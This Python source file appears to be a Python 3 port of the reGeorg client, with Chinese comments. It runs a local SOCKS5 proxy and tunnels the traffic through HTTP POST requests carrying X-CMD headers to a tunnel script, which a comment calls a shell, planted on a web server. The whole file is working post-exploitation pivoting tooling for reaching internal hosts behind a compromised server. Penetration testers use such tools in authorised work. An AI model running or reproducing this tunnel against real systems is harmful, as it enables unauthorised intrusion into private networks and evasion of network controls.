#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import argparse
from urllib.parse import urlparse
from socket import *
from threading import Thread
import requests
from handle_log import logger
from traceback import format_exc

# Constants
SOCKTIMEOUT = 5
RESENDTIMEOUT = 300
VER = "\x05".encode()
METHOD = "\x00".encode()
SUCCESS = "\x00".encode()
SOCKFAIL = "\x01"
NETWORKFAIL = "\x02"
HOSTFAIL = "\x04"
REFUSED = "\x05".encode()
TTLEXPIRED = "\x06"
UNSUPPORTCMD = "\x07"
ADDRTYPEUNSPPORT = "\x08"
UNASSIGNED = "\x09"

BASICCHECKSTRING = "Georg says, 'All seems fine'"

# Globals
READBUFSIZE = 1024

HEADER = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
}

TIMEOUT = (5, 5)


class SocksCmdNotImplemented(Exception):
    pass


class SocksProtocolNotImplemented(Exception):
    pass


class RemoteConnectionFailed(Exception):
    pass


class session(Thread):
    def __init__(self, pSocket, connectString):
        Thread.__init__(self)
        self.pSocket = pSocket
        self.connectString = connectString
        o = urlparse(connectString)
        try:
            self.httpPort = o.port
        except:
            if o.scheme == "https":
                self.httpPort = 443
            else:
                self.httpPort = 80
        else:
            if not o.port:
                if o.scheme == "https":
                    self.httpPort = 443
                else:
                    self.httpPort = 80
        self.httpScheme = o.scheme
        self.httpHost = o.netloc.split(":")[0]
        self.httpPath = o.path
        self.cookie = None

    def parseSocks5(self, sock):
        logger.debug("SocksVersion5 detected")
        # 02:00
        nmethods, methods = (sock.recv(1), sock.recv(1))
        # 05:00
        sock.sendall(VER + METHOD)
        # :02
        ver = sock.recv(1).decode()
        if ver == "\x02":  # this is a hack for proxychains
            # 05:01:00:01----:c0:a8:01:02:00:50
            # '\x05', '\x01', '\x00', '\x01'
            ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
        else:
            cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))
        target = None
        targetPort = None
        if atyp.decode() == "\x01":  # IPv4
            # Reading 6 bytes for the IP and Port
            # c0:a8:01:02
            target = sock.recv(4)
            # 00:50
            targetPort = sock.recv(2)
            # 目标地址192.168.2.1
            self.target = ".".join([str(i) for i in target])
        # elif atyp == "\x03":  # Hostname
        #     targetLen = ord(sock.recv(1))  # hostname length (1 byte)
        #     target = sock.recv(targetLen)
        #     targetPort = sock.recv(2)
        #     target = "".join([unichr(ord(i)) for i in target])
        # elif atyp == "\x04":  # IPv6
        #     target = sock.recv(16)
        #     targetPort = sock.recv(2)
        #     tmp_addr = []
        #     for i in xrange(len(target) / 2):
        #         tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))
        #     target = ":".join(tmp_addr)
        # 80
        self.targetPort = targetPort[0] * 256 + targetPort[1]
        if cmd.decode() == "\x02":  # BIND
            raise SocksCmdNotImplemented("Socks5 - BIND not implemented")
        elif cmd.decode() == "\x03":  # UDP
            raise SocksCmdNotImplemented("Socks5 - UDP not implemented")
        elif cmd.decode() == "\x01":  # CONNECT
            serverIp = self.target
            try:
                serverIp = gethostbyname(self.target)
            except:
                print(format_exc())
                logger.error("oeps")
            # 又转回来\xc0\xa8\x02\x01
            serverIp = bytes(map(int, self.target.split('.')))
            # 获取cookie,在服务端的脚本中，会执行相应端口探测
            self.cookie = self.setupRemoteSession(target=self.target, targetPort=str(self.targetPort))
            if self.cookie:
                sock.sendall(VER + SUCCESS + b"\x00" + b"\x01" + serverIp + chr(self.targetPort // 256).encode() + chr(self.targetPort % 256).encode())
                return True
            else:
                sock.sendall(VER + REFUSED + b"\x00" + b"\x01" + serverIp + chr(self.targetPort // 256).encode() + chr(self.targetPort % 256).encode())
                return False

    def handleSocks(self, sock):
        # 通过proxychain模拟客户端发送数据，第一个字节可以判断是socks5还是socks4
        ver = sock.recv(1).decode()
        # 05:02:00:02
        if ver == "\x05":
            return self.parseSocks5(sock)

    def setupRemoteSession(self, target, targetPort):
        """新的获取cookie方法"""
        headers = {"X-CMD": "CONNECT", "X-TARGET": target, "X-PORT": targetPort}
        cookie = None
        try:
            response = requests.post(url=self.connectString, headers=headers, data=None, timeout=TIMEOUT)
        except Exception as e:
            return
        else:
            if response:
                response_header = response.headers
                if response.status_code == 200 and response_header.get("X-STATUS") == "OK":
                    cookie = response_header.get("Set-Cookie")
                    logger.info("[%s:%s] HTTP [200]: cookie [%s]" % (target, targetPort, cookie))
                elif response_header.get("X-ERROR"):
                    logger.error(response_header.get("X-ERROR"))
            else:
                logger.error("[%s:%s] HTTP [%d]" % (target, targetPort, response.status_code))
            return cookie

    def closeRemoteSession(self):
        HEADER.update({"X-CMD": "DISCONNECT", "Cookie": self.cookie})
        try:
            response = requests.post(url=self.connectString, headers=HEADER, data=None, timeout=TIMEOUT)
        except Exception as e:
            logger.error("Close Connection Failure")
        else:
            if response.status_code == 200:
                logger.info("[%s:%d] Connection Terminated" % (self.httpHost, self.httpPort))

    def reader(self):
        while True:
            try:
                if not self.pSocket:
                    break
                header = {"X-CMD": "READ", "Cookie": self.cookie, "Connection": "Keep-Alive"}
                response = requests.post(url=self.connectString, headers=header, data=None)
                response_data = None
                if response.status_code == 200:
                    response_header = response.headers
                    status = response_header.get("x-status")
                    if status == "OK":
                        response_data = response.content
                    else:
                        logger.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (
                        self.target, self.targetPort, response.status_code, status, response_header.get("X-ERROR")))
                else:
                    logger.error(
                        "[%s:%d] HTTP [%d]: Shutting down" % (self.target, self.targetPort, response.status_code))
                if response_data is None:
                    # Remote socket closed
                    break
                if len(response_data) == 0:
                    time.sleep(0.1)
                    continue
                self.pSocket.send(response_data)
            except Exception as ex:
                print(format_exc())
                raise ex
        self.closeRemoteSession()
        logger.debug("[%s:%d] Closing localsocket" % (self.target, self.targetPort))
        try:
            self.pSocket.close()
        except:
            logger.debug("[%s:%d] Localsocket already closed" % (self.target, self.targetPort))

    def writer(self):
        global READBUFSIZE
        while True:
            try:
                self.pSocket.settimeout(1)
                # 'GET / HTTP/1.1\r\nHost: 192.168.2.1\r\nUser-Agent: curl/7.58.0\r\nAccept: */*\r\n\r\n'
                data = self.pSocket.recv(READBUFSIZE)
                if not data:
                    break
                header = {"X-CMD": "FORWARD", "Cookie": self.cookie, "Content-Type": "application/octet-stream",
                          "Connection": "Keep-Alive"}
                # 携带数据
                response = requests.post(url=self.connectString, headers=header, data=data)
                if response.status_code == 200:
                    response_header = response.headers
                    status = response_header.get("x-status")
                    if status == "OK":
                        if response_header.get("set-cookie") is not None:
                            self.cookie = response_header.get("set-cookie")
                    else:
                        logger.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (
                        self.target, self.targetPort, response.status_code, status, response_header.get("x-error")))
                        break
                else:
                    logger.error(
                        "[%s:%d] HTTP [%d]: Shutting down" % (self.target, self.targetPort, response.status_code))
                    break
                # transferLog.info("[%s:%d] >>>> [%d]" % (self.target, self.port, len(data)))
            except timeout:
                continue
            except Exception as ex:
                raise ex
        self.closeRemoteSession()
        logger.debug("Closing localsocket")
        try:
            self.pSocket.close()
        except:
            logger.debug("Localsocket already closed")

    def run(self):
        try:
            if self.handleSocks(self.pSocket):
                r = Thread(target=self.reader, args=())
                w = Thread(target=self.writer, args=())
                r.start()
                w.start()
                r.join()
                w.join()
        except Exception as e:
            # 报错关闭连接
            logger.error(format_exc())
            self.closeRemoteSession()
            self.pSocket.close()


def askgeorg(url):
    """检测reg连接方法"""
    try:
        response = requests.get(url=url, headers=HEADER, timeout=TIMEOUT)
    except Exception as e:
        logger.error(format_exc())
        return False
    else:
        if response:
            text = response.text.strip()
            if response.status_code == 200 and text == "Georg says, 'All seems fine'":
                logger.info(text)
                return True
        else:
            return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Socks server for reGeorg HTTP(s) tunneller')
    parser.add_argument("-l", "--listen-on", metavar="", help="The default listening address", default="127.0.0.1")
    parser.add_argument("-p", "--listen-port", metavar="", help="The default listening port", type=int, default="8888")
    parser.add_argument("-r", "--read-buff", metavar="", help="Local read buffer, max data to be sent per POST",
                        type=int, default="1024")
    parser.add_argument("-u", "--url", metavar="", required=True, help="The url containing the tunnel script")
    # 取消了原通过命令行指定log级别,通过配置文件指定
    # parser.add_argument("-v", "--verbose", metavar="", help="Verbose output[INFO|DEBUG]", default="INFO")

    args = parser.parse_args()
    logger.info("Starting socks server [%s:%d], tunnel at [%s]" % (args.listen_on, args.listen_port, args.url))
    logger.info("Checking if Georg is ready")

    # 查看shell连通性
    if not askgeorg(url=args.url):
        logger.info("Georg is not ready, please check url")
        exit()

    READBUFSIZE = args.read_buff
    # 创建socket
    servSock = socket(AF_INET, SOCK_STREAM)
    servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    # 127.0.0.1:8889,ubuntu中proxychains监听8889端口
    servSock.bind((args.listen_on, args.listen_port))
    servSock.listen(1000)
    while True:
        try:
            sock, addr_info = servSock.accept()
            sock.settimeout(SOCKTIMEOUT)
            logger.debug("Incomming connection")
            # 发起传输数据请求
            session(sock, args.url).start()
        except KeyboardInterrupt:
            break
        except Exception as e:
            logger.error(e)
    servSock.close()
